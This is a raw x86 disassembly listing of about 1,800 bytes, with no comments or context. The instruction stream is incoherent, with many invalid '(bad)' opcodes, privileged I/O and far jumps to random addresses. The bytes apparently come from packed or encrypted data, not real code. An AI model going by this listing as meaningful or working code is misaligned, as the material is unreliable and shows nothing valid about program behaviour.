  40be92:	xor    al,0xe8
  40be94:	outs   dx,BYTE PTR ds:[esi]
  40be95:	outs   dx,BYTE PTR ds:[esi]
  40be96:	push   eax
  40be97:	cs (bad) 
  40be9b:	cmp    dl,BYTE PTR [edx]
  40be9d:	and    BYTE PTR [ebp-0x563087f1],dh
  40bea3:	mov    dl,BYTE PTR [edi-0x80]
  40bea6:	xor    ebp,DWORD PTR cs:[ecx-0x38af7c44]
  40bead:	or     eax,DWORD PTR [eax]
  40beaf:	pushf  
  40beb0:	sub    DWORD PTR [edi+0x33d68e1d],edi
  40beb6:	loope  0x40bed2
  40beb8:	cli    
  40beb9:	xchg   edx,eax
  40beba:	xchg   edi,eax
  40bebb:	sbb    al,0x92
  40bebd:	pusha  
  40bebe:	call   0xf9a7:0x48605e7
  40bec5:	mov    al,0x65
  40bec7:	mov    al,0xd5
  40bec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beca:	pop    ds
  40becb:	and    BYTE PTR [ecx+0x5b],0x7e
  40becf:	adc    al,0xfc
  40bed1:	sub    DWORD PTR [eax+0x4691a429],ecx
  40bed7:	inc    BYTE PTR [ebx+0x172914e0]
  40bedd:	shr    DWORD PTR [ecx+0x3c3fe0d4],cl
  40bee3:	add    DWORD PTR [ecx],edx
  40bee5:	add    cl,bl
  40bee7:	cdq    
  40bee8:	push   edi
  40bee9:	ja     0x40be78
  40beeb:	inc    edx
  40beec:	xchg   esi,eax
  40beed:	jnp    0x40bee3
  40beef:	sub    eax,0xe389a405
  40bef4:	(bad)
  40bef7:	mov    WORD PTR ds:0xa641523c,gs
  40befd:	add    dh,BYTE PTR [ebp+0x72fd0d4f]
  40bf03:	mov    gs,WORD PTR [edi]
  40bf05:	iret   
  40bf06:	mov    ds,WORD PTR [ebx+0x7b]
  40bf09:	xchg   ebp,eax
  40bf0a:	xchg   esp,eax
  40bf0b:	dec    esi
  40bf0c:	jno    0x40be91
  40bf0e:	rcr    BYTE PTR [ecx],cl
  40bf10:	stos   BYTE PTR es:[edi],al
  40bf11:	loope  0x40bf39
  40bf13:	xor    bh,BYTE PTR [esi-0x3053e80d]
  40bf19:	mov    DWORD PTR [esi],edi
  40bf1b:	fwait
  40bf1c:	jmp    0x5a81:0xa653bc61
  40bf23:	bound  ebp,QWORD PTR [ebx+0x2]
  40bf26:	pop    eax
  40bf27:	out    0x24,eax
  40bf29:	adc    BYTE PTR [edi],dl
  40bf2b:	mov    ds:0xe037bfa6,al
  40bf30:	ret    
  40bf31:	inc    DWORD PTR [edx+0x71d3a155]
  40bf37:	(bad)  
  40bf38:	les    edi,FWORD PTR [ebx+edx*8-0x36]
  40bf3c:	inc    ebx
  40bf3d:	adc    DWORD PTR [ecx-0x3d],ebp
  40bf40:	dec    esi
  40bf41:	adc    DWORD PTR [eax-0x6394c6f1],esi
  40bf47:	dec    esi
  40bf48:	mov    WORD PTR [eax-0x1dbfa93e],?
  40bf4e:	fwait
  40bf4f:	dec    DWORD PTR [esi]
  40bf51:	imul   eax,DWORD PTR [ecx-0x65],0x5b6ae576
  40bf58:	out    0xcd,al
  40bf5a:	add    DWORD PTR [esi],ebx
  40bf5c:	imul   BYTE PTR [eax-0x45]
  40bf5f:	sub    eax,0x4c66adbe
  40bf64:	mov    al,ds:0x328610c
  40bf69:	jae    0x40bfd4
  40bf6b:	sub    bl,BYTE PTR [esi]
  40bf6d:	fnstsw ax
  40bf6f:	dec    ebx
  40bf70:	repnz sub DWORD PTR [eax-0x3027449d],esi
  40bf77:	mov    bl,0x6
  40bf79:	xchg   DWORD PTR [ebx],ebx
  40bf7b:	sbb    eax,0xaa1715ec
  40bf80:	repz les ebp,FWORD PTR [ecx]
  40bf83:	sbb    eax,0xf0fa30d1
  40bf88:	and    al,0xcf
  40bf8a:	push   edi
  40bf8b:	cdq    
  40bf8c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf8e:	pop    es
  40bf8f:	lods   al,BYTE PTR ds:[esi]
  40bf90:	xchg   ebx,eax
  40bf91:	pop    ebp
  40bf92:	mov    eax,0x5e8bae8f
  40bf97:	out    dx,al
  40bf98:	adc    DWORD PTR [edi-0x612e2525],esp
  40bf9e:	sbb    eax,0xe9f925d4
  40bfa3:	stc    
  40bfa4:	sar    ecx,0x65
  40bfa7:	fucomip st,st(4)
  40bfa9:	in     al,dx
  40bfaa:	ret    0x65da
  40bfad:	pop    ds
  40bfae:	push   edx
  40bfaf:	or     al,ch
  40bfb1:	les    esi,FWORD PTR [ebx-0x3421d7c0]
  40bfb7:	mov    esp,0x763679e7
  40bfbc:	jg     0x40bfd9
  40bfbe:	and    ch,BYTE PTR [ebx+0x7b]
  40bfc1:	pop    esi
  40bfc2:	rcl    DWORD PTR [eax-0x2d453ead],0xa
  40bfc9:	push   ecx
  40bfca:	or     al,0x88
  40bfcc:	call   0x20d58fe2
  40bfd1:	sahf   
  40bfd2:	mov    dl,ah
  40bfd4:	call   FWORD PTR [edx]
  40bfd6:	pop    edi
  40bfd7:	xor    esp,DWORD PTR [edx+0x753e9e7]
  40bfdd:	lea    edx,fs:[ebx-0x30d10b7d]
  40bfe4:	adc    ebp,DWORD PTR ds:[eax-0x69]
  40bfe8:	inc    ebp
  40bfe9:	or     DWORD PTR [ecx+esi*2+0x69],ecx
  40bfed:	adc    al,0x58
  40bfef:	inc    esp
  40bff0:	add    al,0x4c
  40bff2:	sbb    ecx,esi
  40bff4:	cmp    BYTE PTR [edx],cl
  40bff6:	xchg   ebp,eax
  40bff7:	or     ebx,edx
  40bff9:	mov    ds:0xa7b3b2fd,eax
  40bffe:	retf   
  40bfff:	jmp    0x40bfc8
  40c001:	mov    bh,0xb6
  40c003:	imul   edx,DWORD PTR [edi],0x403799c
  40c009:	lahf   
  40c00a:	ins    BYTE PTR es:[edi],dx
  40c00b:	lds    esi,FWORD PTR [esi]
  40c00d:	jb     0x40c038
  40c00f:	popa   
  40c010:	outs   dx,DWORD PTR ds:[esi]
  40c011:	lahf   
  40c012:	(bad)  
  40c013:	(bad)  
  40c014:	push   ecx
  40c015:	xchg   esp,eax
  40c016:	aad    0x91
  40c018:	mov    ebp,0x1bcc801e
  40c01d:	mov    edi,DWORD PTR ds:0x79638faa
  40c023:	jg     0x40c029
  40c025:	int3   
  40c026:	cmp    al,0xe
  40c028:	mov    ds:0xaed81c1f,al
  40c02d:	cs mov edx,esp
  40c030:	(bad)  
  40c031:	mov    ebx,ecx
  40c033:	mov    cl,0x38
  40c035:	and    ebx,DWORD PTR [ecx-0x30]
  40c038:	lds    esp,FWORD PTR [esi+0x2b2cae8b]
  40c03e:	lods   eax,DWORD PTR ds:[esi]
  40c03f:	sbb    eax,0xeeccad31
  40c044:	int    0x98
  40c046:	push   cs
  40c047:	outs   dx,DWORD PTR ds:[esi]
  40c048:	dec    ebp
  40c049:	inc    esi
  40c04a:	les    edx,FWORD PTR ds:0x5c12aea3
  40c050:	mov    eax,0xef525acf
  40c055:	aad    0x7d
  40c057:	inc    edx
  40c058:	std    
  40c059:	and    bl,dh
  40c05b:	inc    edx
  40c05c:	xlat   BYTE PTR ds:[ebx]
  40c05d:	out    dx,al
  40c05e:	mov    edi,0x88317d65
  40c063:	inc    ebp
  40c064:	leave  
  40c065:	inc    ebp
  40c066:	sti    
  40c067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c068:	dec    esp
  40c069:	mov    ebx,0xd587ed78
  40c06e:	push   ebp
  40c06f:	scas   al,BYTE PTR es:[edi]
  40c070:	jle    0x40c0ac
  40c072:	mov    bh,0x86
  40c074:	and    eax,0xc816f80e
  40c079:	jle    0x40c08d
  40c07b:	inc    ebp
  40c07c:	inc    esp
  40c07d:	setno  BYTE PTR fs:[eax+0x75]
  40c082:	pop    esp
  40c083:	pop    ecx
  40c084:	jns    0x40c0ba
  40c086:	fstp   TBYTE PTR [edi]
  40c088:	jns    0x40c07a
  40c08a:	inc    edx
  40c08b:	push   0xe4ca4bc9
  40c090:	mov    ah,0x7b
  40c092:	adc    eax,0xd0fc2492
  40c097:	add    al,0xe7
  40c099:	inc    eax
  40c09a:	retf   0xb438
  40c09d:	les    edx,FWORD PTR [eax-0x2583f732]
  40c0a3:	sub    al,0xf2
  40c0a5:	popa   
  40c0a6:	lds    ebp,FWORD PTR [ebx+0x27]
  40c0a9:	xchg   edi,eax
  40c0aa:	or     ah,BYTE PTR [edx+0x35933eff]
  40c0b0:	pop    ds
  40c0b1:	fidivr WORD PTR [eax+0x5708de74]
  40c0b7:	mov    BYTE PTR [esi+0x5b],0xae
  40c0bb:	mov    al,ds:0x459a690d
  40c0c0:	xchg   ecx,eax
  40c0c1:	shl    dl,1
  40c0c3:	fwait
  40c0c4:	mov    ecx,DWORD PTR [ecx+0x3a890ea0]
  40c0ca:	jns    0x40c0a2
  40c0cc:	fistp  DWORD PTR [edi-0x34ee91e]
  40c0d2:	add    eax,0x8dc10300
  40c0d7:	les    edx,FWORD PTR [ebx]
  40c0d9:	idiv   BYTE PTR [esi-0x57916f3]
  40c0df:	or     ecx,edi
  40c0e1:	adc    eax,0x17abfc90
  40c0e6:	jl     0x40c070
  40c0e8:	dec    eax
  40c0e9:	xchg   esp,eax
  40c0ea:	and    ecx,DWORD PTR [ecx-0xe3e32d7]
  40c0f0:	adc    eax,0xa16e51be
  40c0f5:	dec    edi
  40c0f6:	(bad)  
  40c0f7:	(bad)  
  40c0f8:	(bad)  
  40c0f9:	xchg   esi,eax
  40c0fa:	inc    ecx
  40c0fb:	xor    eax,0xcbeb571c
  40c100:	test   DWORD PTR [eax],eax
  40c102:	sub    BYTE PTR cs:0x3fd51ab4,ah
  40c109:	icebp  
  40c10a:	xchg   ebx,eax
  40c10b:	dec    ecx
  40c10c:	data16 lods al,BYTE PTR ds:[esi]
  40c10f:	mov    dl,BYTE PTR [ebx+esi*1]
  40c112:	and    al,0x65
  40c114:	mov    DWORD PTR [edx],esi
  40c116:	dec    edi
  40c117:	mov    ds:0x4297b223,al
  40c11c:	popa   
  40c11d:	mov    BYTE PTR [ebp-0x3e315712],cl
  40c123:	push   cs
  40c124:	sbb    ah,BYTE PTR [edx-0x44]
  40c127:	js     0x40c0e1
  40c129:	fs (bad) 
  40c12b:	leave  
  40c12c:	fcom   DWORD PTR [edx]
  40c12e:	int3   
  40c12f:	mov    cl,0x3
  40c131:	dec    esp
  40c132:	cmp    BYTE PTR [edx],al
  40c134:	leave  
  40c135:	and    ecx,eax
  40c137:	fisub  WORD PTR [edi+ecx*4-0x7f]
  40c13b:	(bad)  
  40c13c:	jmp    DWORD PTR [esi+0x18]
  40c13f:	push   0xffffffc0
  40c141:	add    al,bl
  40c143:	jmp    0x40c161
  40c145:	inc    ebx
  40c146:	sahf   
  40c147:	mov    bl,0x36
  40c149:	cmc    
  40c14a:	retf   0x9b0b
  40c14d:	cld    
  40c14e:	pop    ebp
  40c14f:	pop    esp
  40c150:	push   es
  40c151:	lods   eax,DWORD PTR ds:[esi]
  40c153:	imul   eax,DWORD PTR [ecx-0x620bf47a],0x29
  40c15a:	ret    
  40c15b:	test   al,0x9d
  40c15d:	aaa    
  40c15e:	cmc    
  40c15f:	mov    ah,BYTE PTR [edi+0xd]
  40c162:	adc    edx,ecx
  40c164:	sar    DWORD PTR [ebx+eax*4-0x475aaf6f],cl
  40c16b:	sbb    bh,ch
  40c16d:	cmc    
  40c16e:	jg     0x40c124
  40c170:	fild   QWORD PTR [edx]
  40c172:	fwait
  40c173:	lea    ebp,[ebx-0x63]
  40c176:	in     al,dx
  40c177:	adc    al,0x43
  40c179:	mov    eax,ds:0x7f0d938
  40c17e:	loope  0x40c1b6
  40c180:	add    BYTE PTR [ebx+0x79],dl
  40c183:	into   
  40c184:	sbb    al,0xdd
  40c186:	cmc    
  40c187:	pop    ds
  40c188:	dec    eax
  40c189:	add    eax,DWORD PTR [eax]
  40c18b:	lods   al,BYTE PTR ds:[esi]
  40c18c:	cs push 0x514f02b1
  40c192:	xchg   DWORD PTR [ecx],eax
  40c194:	inc    eax
  40c195:	mov    ah,0xa1
  40c197:	mov    cs,ebp
  40c199:	das    
  40c19a:	inc    ecx
  40c19b:	mov    al,BYTE PTR [eax+0x13d8d145]
  40c1a1:	dec    esi
  40c1a2:	std    
  40c1a3:	and    DWORD PTR [esi+0x33],ecx
  40c1a6:	dec    esp
  40c1a7:	xor    edi,DWORD PTR [edi-0x7e]
  40c1aa:	repz push edx
  40c1ac:	div    DWORD PTR cs:[ebp+0x56]
  40c1b0:	mov    ch,0xb9
  40c1b2:	ins    BYTE PTR es:[edi],dx
  40c1b3:	pop    ebp
  40c1b4:	rcl    BYTE PTR [esi],1
  40c1b6:	dec    esi
  40c1b7:	ja     0x40c1d9
  40c1b9:	pop    esi
  40c1ba:	fsubr  QWORD PTR [ecx]
  40c1bc:	in     al,dx
  40c1bd:	lods   al,BYTE PTR ds:[esi]
  40c1be:	and    dl,bh
  40c1c0:	xor    edi,esi
  40c1c2:	stos   DWORD PTR es:[edi],eax
  40c1c3:	cwde   
  40c1c4:	gs pop ds
  40c1c6:	lods   al,BYTE PTR ds:[esi]
  40c1c7:	pusha  
  40c1c8:	dec    edi
  40c1c9:	push   esi
  40c1ca:	ss xchg ebp,eax
  40c1cc:	iret   
  40c1cd:	push   ebp
  40c1ce:	fcomp  QWORD PTR [ecx+ecx*8-0x3b]
  40c1d2:	ss popw ds
  40c1d5:	shl    DWORD PTR [ebx],cl
  40c1d7:	imul   ch
  40c1d9:	xchg   esi,eax
  40c1da:	sti    
  40c1db:	jnp    0x40c17e
  40c1dd:	adc    DWORD PTR [esi-0xf],edi
  40c1e0:	fucomp st(0)
  40c1e2:	mov    dh,0x10
  40c1e4:	mov    edi,0x7e3cca44
  40c1e9:	jbe    0x40c1b6
  40c1eb:	mov    eax,0x3badfe69
  40c1f0:	and    DWORD PTR [ebx+ebp*8-0x7ef1a561],ecx
  40c1f7:	pop    ebx
  40c1f8:	int    0xe2
  40c1fa:	lahf   
  40c1fb:	gs data16 jb 0x40c1fc
  40c1ff:	dec    edi
  40c200:	jmp    0xcf25ee72
  40c205:	add    cl,BYTE PTR [eax-0x49]
  40c208:	in     eax,0xd2
  40c20a:	ja     0x40c212
  40c20c:	lods   al,BYTE PTR ds:[esi]
  40c20d:	xchg   edx,eax
  40c20e:	jmp    0x40c24d
  40c210:	jmp    0x260a42eb
  40c215:	adc    DWORD PTR [edi],esp
  40c217:	dec    esi
  40c218:	(bad)  
  40c219:	(bad)  
  40c21a:	lock sti 
  40c21c:	dec    edi
  40c21d:	sub    al,0x2e
  40c21f:	inc    edx
  40c220:	(bad)  
  40c221:	xlat   BYTE PTR ds:[ebx]
  40c222:	mov    cl,BYTE PTR [ecx+esi*2+0x38b6950d]
  40c229:	dec    ebp
  40c22a:	sub    eax,0xad6488ef
  40c22f:	jb     0x40c265
  40c231:	fild   WORD PTR [ebx+0x40]
  40c234:	mov    ?,WORD PTR [ecx+0x14c03d74]
  40c23a:	or     edi,edi
  40c23c:	loope  0x40c2b2
  40c23e:	mov    dl,0x3e
  40c240:	and    BYTE PTR [ebp+0x125bac87],bh
  40c246:	cmp    bl,BYTE PTR [edx]
  40c248:	rcr    DWORD PTR [edx-0x324a78e8],0x3
  40c24f:	aad    0x11
  40c251:	pop    ds
  40c252:	mov    esi,0x6df2ca28
  40c257:	sub    eax,0x790f1561
  40c25c:	push   ecx
  40c25d:	sbb    DWORD PTR [ecx+0x4a],ebx
  40c260:	push   ss
  40c261:	xor    BYTE PTR [ebx+0x19],bl
  40c264:	sbb    dl,BYTE PTR [esi+0x40]
  40c267:	test   al,0xb4
  40c269:	cmp    eax,0xac8bcb89
  40c26e:	push   edx
  40c26f:	sbb    bl,cl
  40c271:	scas   eax,DWORD PTR es:[edi]
  40c272:	mov    bl,0x5f
  40c274:	push   cs
  40c275:	in     eax,dx
  40c276:	test   al,0x8
  40c278:	sub    bh,al
  40c27a:	out    dx,al
  40c27b:	mov    ds:0x74536645,eax
  40c280:	lods   eax,DWORD PTR ds:[esi]
  40c281:	fist   DWORD PTR [eax]
  40c283:	jg     0x40c242
  40c285:	dec    esi
  40c286:	das    
  40c287:	mov    ecx,0x55e19377
  40c28c:	mov    eax,ds
  40c28e:	fdivr  DWORD PTR [ecx]
  40c290:	dec    ebx
  40c291:	in     al,dx
  40c292:	xchg   esi,eax
  40c293:	xchg   ebp,eax
  40c294:	mov    dh,0xce
  40c296:	inc    ebx
  40c297:	xor    ebx,DWORD PTR [ebx+0x49]
  40c29a:	sbb    eax,0x50ebc649
  40c29f:	mov    edi,0xb49155bd
  40c2a4:	outs   dx,BYTE PTR ds:[esi]
  40c2a5:	inc    esi
  40c2a6:	imul   esp,DWORD PTR [esi],0x42
  40c2a9:	outs   dx,DWORD PTR ds:[esi]
  40c2aa:	data16 aam 0x25
  40c2ad:	cmc    
  40c2ae:	test   BYTE PTR [eax],ch
  40c2b0:	pop    ebx
  40c2b1:	jge    0x40c31a
  40c2b3:	dec    esi
  40c2b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2b5:	mov    dl,0x8c
  40c2b7:	sub    DWORD PTR [ecx+0x7c],edx
  40c2ba:	or     cl,BYTE PTR [ecx-0x2a017538]
  40c2c0:	jno    0x40c286
  40c2c2:	mov    WORD PTR [eax],?
  40c2c4:	or     DWORD PTR [edx],ebx
  40c2c6:	fcomi  st,st(6)
  40c2c8:	std    
  40c2c9:	mov    ah,0x89
  40c2cb:	pop    ss
  40c2cc:	pop    edx
  40c2cd:	pop    edx
  40c2ce:	cmp    ch,BYTE PTR [eax-0x61]
  40c2d1:	xchg   ebx,eax
  40c2d2:	or     ebp,DWORD PTR [ebx-0x31ca40fc]
  40c2d8:	clc    
  40c2d9:	xlat   BYTE PTR ds:[ebx]
  40c2da:	mov    dl,0x2f
  40c2dc:	dec    esp
  40c2dd:	dec    eax
  40c2de:	pop    ebp
  40c2df:	cdq    
  40c2e0:	or     BYTE PTR [edi+0x36f74626],cl
  40c2e6:	fscale 
  40c2e8:	xor    DWORD PTR [edx+0x6f0059e7],0x9621ebb4
  40c2f2:	push   es
  40c2f3:	xchg   BYTE PTR [esp+esi*2],al
  40c2f6:	outs   dx,BYTE PTR ds:[esi]
  40c2f7:	fcom   DWORD PTR [edx-0xbda272b]
  40c2fd:	xor    al,0x76
  40c2ff:	fldcw  WORD PTR [esi+0xc]
  40c302:	jo     0x40c350
  40c304:	lods   al,BYTE PTR ds:[esi]
  40c305:	sub    edx,DWORD PTR [ebp+0x18]
  40c308:	sub    edx,eax
  40c30a:	aas    
  40c30b:	dec    edi
  40c30c:	frstor [eax+0x30]
  40c30f:	push   esp
  40c310:	cmp    DWORD PTR [eax],ebp
  40c312:	mov    gs,eax
  40c314:	cmp    al,0x8
  40c316:	std    
  40c317:	in     eax,0xc
  40c319:	xor    al,0x65
  40c31b:	xchg   edi,eax
  40c31c:	and    BYTE PTR [edi+0x46],ch
  40c31f:	or     al,0xfc
  40c321:	pop    edi
  40c322:	iret   
  40c323:	jecxz  0x40c2c3
  40c325:	mov    eax,ds:0xa253c66
  40c32a:	shl    BYTE PTR [ebp-0x77],0x95
  40c32e:	mov    eax,0xc5da4f9a
  40c333:	test   al,0x99
  40c335:	sbb    edi,DWORD PTR [ebx-0x40]
  40c338:	jno    0x40c329
  40c33a:	scas   eax,DWORD PTR es:[edi]
  40c33b:	mov    bh,0xa6
  40c33d:	inc    edi
  40c33e:	(bad)
  40c342:	jp     0x40c379
  40c344:	xchg   BYTE PTR [esp+ebx*1-0x50],bl
  40c348:	in     eax,dx
  40c349:	push   esi
  40c34a:	pop    ecx
  40c34b:	shl    DWORD PTR [edi],cl
  40c34d:	aas    
  40c34e:	push   esp
  40c34f:	pop    ebp
  40c350:	mov    ebx,esi
  40c352:	pop    eax
  40c353:	jb     0x40c3cd
  40c355:	iret   
  40c356:	mov    ds:0xb87730dc,eax
  40c35b:	dec    esi
  40c35c:	xchg   esp,eax
  40c35d:	adc    BYTE PTR [eax+0xa],cl
  40c360:	std    
  40c361:	push   0x785a4b9f
  40c366:	dec    edi
  40c367:	jmp    0xee58:0x326e79a0
  40c36e:	xor    ah,ah
  40c370:	mov    ebp,0x9edb5c7b
  40c375:	sar    BYTE PTR [ebp-0x5ca2a71d],1
  40c37b:	fmul   st(0),st
  40c37d:	rol    BYTE PTR [ebx],cl
  40c37f:	mov    dl,0x83
  40c381:	out    0x65,al
  40c383:	nop
  40c384:	xchg   esi,eax
  40c385:	push   esp
  40c386:	cmp    al,0x89
  40c388:	daa    
  40c389:	dec    esi
  40c38a:	call   0xf9f37b91
  40c38f:	or     DWORD PTR [edi+ecx*1],eax
  40c392:	push   esp
  40c393:	xchg   BYTE PTR [ebp-0x92c7362],ch
  40c399:	push   ebx
  40c39a:	or     eax,0xef390f20
  40c39f:	cdq    
  40c3a0:	cmc    
  40c3a1:	sub    dh,BYTE PTR [edx-0x4d56bce1]
  40c3a7:	mov    edi,0x2329efc6
  40c3ac:	in     eax,dx
  40c3ad:	retf   
  40c3ae:	add    DWORD PTR [eax],esi
  40c3b0:	rcr    DWORD PTR [edi],cl
  40c3b2:	xchg   edx,eax
  40c3b3:	cmp    eax,0x35203de3
  40c3b8:	jecxz  0x40c3a2
  40c3ba:	jmp    0xda947dbd
  40c3bf:	call   0xc6803453
  40c3c4:	mov    esi,0xacfd6019
  40c3c9:	jb     0x40c382
  40c3cb:	imul   eax,DWORD PTR [ebp+0x748a3401],0xffffffcd
  40c3d2:	popf   
  40c3d3:	addr16 jne 0x40c434
  40c3d6:	push   ss
  40c3d7:	mov    bl,0xff
  40c3d9:	lods   al,BYTE PTR ds:[esi]
  40c3da:	out    dx,al
  40c3db:	xor    edi,DWORD PTR [esi]
  40c3dd:	and    edx,edi
  40c3df:	rcl    DWORD PTR [edx],1
  40c3e1:	je     0x40c42d
  40c3e3:	ds and ebx,eax
  40c3e6:	pop    ss
  40c3e7:	icebp  
  40c3e8:	aad    0x5c
  40c3ea:	lds    esp,FWORD PTR [eax]
  40c3ec:	or     ecx,esi
  40c3ee:	dec    ebx
  40c3ef:	jo     0x40c3a8
  40c3f1:	and    eax,DWORD PTR [ebx]
  40c3f3:	push   0x44
  40c3f5:	pusha  
  40c3f6:	arpl   WORD PTR [esi-0x5defaf0d],di
  40c3fc:	bound  ebp,QWORD PTR [edx-0xa7febb2]
  40c402:	lea    ecx,[edx-0x44]
  40c405:	jecxz  0x40c3a4
  40c407:	and    eax,0xdb280c68
  40c40c:	mov    eax,0x5472dedf
  40c411:	imul   DWORD PTR [esi-0x4f]
  40c414:	(bad)  
  40c415:	mov    cl,0x92
  40c417:	js     0x40c427
  40c419:	sbb    ah,BYTE PTR [eax-0x79]
  40c41c:	(bad)  
  40c41d:	daa    
  40c41e:	and    DWORD PTR [ecx-0x316045fe],eax
  40c424:	add    BYTE PTR [edx-0x6d32b09a],cl
  40c42a:	dec    esp
  40c42b:	jmp    0x248796a4
  40c430:	jns    0x40c486
  40c432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c433:	or     BYTE PTR [esp+eiz*4-0x70af54d5],ah
  40c43a:	mov    ds:0xe3f73959,eax
  40c43f:	adc    BYTE PTR [ebx+0x8fa9e0f],ch
  40c445:	push   cs
  40c446:	xchg   esi,eax
  40c447:	jne    0x40c432
  40c449:	xor    al,BYTE PTR [edx+0x75cce287]
  40c44f:	pop    eax
  40c450:	adc    DWORD PTR [eax+0x1c4af51d],edx
  40c456:	pop    esi
  40c457:	and    esi,ecx
  40c459:	push   0x8a24280a
  40c45e:	xchg   ecx,eax
  40c45f:	mov    ebp,0x2ea3af1a
  40c464:	mov    al,ds:0x9ed0fad1
  40c469:	mov    al,ds:0x494819ab
  40c46e:	or     eax,0x6d6b9d71
  40c473:	ficom  DWORD PTR [edi]
  40c475:	jmp    0x8c30:0x54c02ee8
  40c47c:	lock xor BYTE PTR [esi-0x6e60f8ae],0x68
  40c484:	mov    edi,0x5afae0b8
  40c489:	ins    DWORD PTR es:[edi],dx
  40c48a:	or     al,0x6a
  40c48c:	out    0x94,al
  40c48e:	test   DWORD PTR [ebp-0x52851005],ebp
  40c494:	inc    esi
  40c495:	std    
  40c496:	dec    ebx
  40c497:	sbb    ebp,DWORD PTR [esi-0x6e438662]
  40c49d:	mov    DWORD PTR [esi],edi
  40c49f:	jnp    0x40c4da
  40c4a1:	sub    esp,DWORD PTR [edi-0x69]
  40c4a4:	std    
  40c4a5:	push   0x3b
  40c4a7:	push   0xabca6ceb
  40c4ac:	mov    BYTE PTR [ebx+0x4c969396],dl
  40c4b2:	mov    eax,ds:0x5b5109ea
  40c4b7:	jo     0x40c45b
  40c4b9:	lock into 
  40c4bb:	in     al,0xaf
  40c4bd:	fwait
  40c4be:	push   ss
  40c4bf:	retf   
  40c4c0:	jge    0x40c478
  40c4c2:	sub    al,BYTE PTR [eax+0x4de7c5d1]
  40c4c8:	mov    al,0x15
  40c4ca:	stc    
  40c4cb:	cld    
  40c4cc:	push   es
  40c4cd:	xchg   esi,eax
  40c4ce:	mov    dl,0xa3
  40c4d0:	js     0x40c4e9
  40c4d2:	ds sub al,0xa
  40c4d5:	jecxz  0x40c556
  40c4d7:	sub    eax,0x43a9a144
  40c4dc:	xchg   esp,eax
  40c4dd:	push   edi
  40c4de:	pop    ss
  40c4df:	shr    DWORD PTR [eax-0x19e09659],0xda
  40c4e6:	call   0x2a0b1b0c
  40c4eb:	pop    ecx
  40c4ec:	or     eax,0x6f84ee7c
  40c4f1:	mov    cl,0xb4
  40c4f3:	push   edi
  40c4f4:	inc    eax
  40c4f5:	jo     0x40c54b
  40c4f7:	sbb    ch,al
  40c4f9:	repnz pop es
  40c4fb:	shr    esi,1
  40c4fd:	adc    dl,BYTE PTR [edi-0x78]
  40c500:	ins    BYTE PTR es:[edi],dx
  40c501:	ins    DWORD PTR es:[edi],dx
  40c502:	outs   dx,BYTE PTR ds:[esi]
  40c503:	outs   dx,BYTE PTR ds:[esi]
  40c504:	and    BYTE PTR [ebx],bh
  40c506:	mov    cs,WORD PTR [esi-0x2854f362]
  40c50c:	das    
  40c50d:	and    BYTE PTR [esp+eax*2+0x21b30721],bh
  40c514:	outs   dx,DWORD PTR ds:[esi]
  40c515:	call   0x3fd8:0x1f30def5
  40c51c:	jp     0x40c516
  40c51e:	(bad)  
  40c51f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c520:	pop    ebp
  40c521:	jmp    0x40c515
  40c523:	jg     0x40c540
  40c525:	and    al,0x9f
  40c527:	call   0xf57c:0xfce8fdd0
  40c52e:	xchg   ebp,ebp
  40c530:	pop    edi
  40c531:	sub    DWORD PTR [ecx+0x26],esi
  40c534:	hlt    
  40c535:	mov    esp,DWORD PTR [ebx+0x2864f5f4]
  40c53b:	scas   eax,DWORD PTR es:[edi]
  40c53c:	aaa    
  40c53d:	sub    eax,0x2ab44e8e
  40c542:	dec    esp
  40c543:	push   0x14d5973a
  40c548:	popa   
  40c549:	shl    edi,1
  40c54b:	gs in  eax,0x91
  40c54e:	(bad)  
  40c54f:	call   0xbad3ed71
  40c554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c555:	ss cli 
  40c557:	add    eax,0xe505d3a6
  40c55c:	xchg   esp,eax
  40c55d:	inc    ebx
  40c55e:	ret    
  40c55f:	pop    ecx
  40c560:	cmp    eax,0x25f9fa00
  40c565:	add    al,0xd
  40c567:	sub    ah,dh
  40c569:	lahf   
  40c56a:	mov    bl,0xa5
  40c56c:	adc    ecx,DWORD PTR [eax]
  40c56e:	push   ds
  40c56f:	das    
  40c570:	dec    edi
  40c571:	outs   dx,DWORD PTR ds:[esi]
  40c572:	cmp    al,0x12
  40c574:	sbb    eax,DWORD PTR [esp+ebx*4-0x5f]
  40c578:	leave  
  40c579:	mov    al,ds:0xe157d15e
  40c57e:	ins    DWORD PTR es:[edi],dx
  40c57f:	sbb    eax,0xb12dc333
  40c584:	pop    edi
  40c585:	aas    
  40c586:	adc    DWORD PTR [ebp*8-0x4de07cd5],ecx
  40c58d:	hlt    
  40c58e:	das    
  40c58f:	mov    eax,0x7f5c7223
  40c594:	imul   edx,DWORD PTR [edx],0x65
  40c597:	imul   eax,DWORD PTR [ebp+0x32],0x413e3423
  40c59e:	jmp    0x40c5bb
  40c5a0:	popa   
  40c5a1:	push   0xd28269ad
  40c5a6:	mov    cl,0xae
  40c5a8:	enter  0x67ce,0x9c
  40c5ac:	or     bh,BYTE PTR [edi+edx*2]
  40c5af:	repz xor BYTE PTR [eax],0x77
  40c5b3:	sbb    BYTE PTR [ecx+edx*8+0x77],dh
  40c5b7:	and    BYTE PTR [ecx+0x7],0xa0
  40c5bb:	cmc    
  40c5bc:	push   cs
  40c5bd:	push   edx
  40c5be:	jnp    0x40c581
  40c5c0:	test   DWORD PTR [ebx],edx
  40c5c2:	mov    cl,0x9
  40c5c4:	xlat   BYTE PTR ds:[ebx]
  40c5c5:	loop   0x40c5b0
  40c5c7:	into   
  40c5c8:	pop    ds
  40c5c9:	clc    
  40c5ca:	jae    0x40c594
  40c5cc:	dec    esi
  40c5cd:	inc    BYTE PTR [esp+eax*4+0x2c80523]
  40c5d4:	neg    ah
  40c5d6:	dec    esi
  40c5d7:	jmp    0x4816:0x42498afa
  40c5de:	(bad)  
  40c5e0:	repz bswap esi
  40c5e3:	push   eax
  40c5e4:	sub    ebp,DWORD PTR [ecx+0x40bbb180]
  40c5ea:	emms   
  40c5ec:	cmp    BYTE PTR [ecx-0x38],ah
  40c5ef:	and    ebx,ecx
  40c5f1:	outs   dx,DWORD PTR cs:[esi]
  40c5f3:	enter  0xf04b,0x2e
  40c5f7:	push   ds
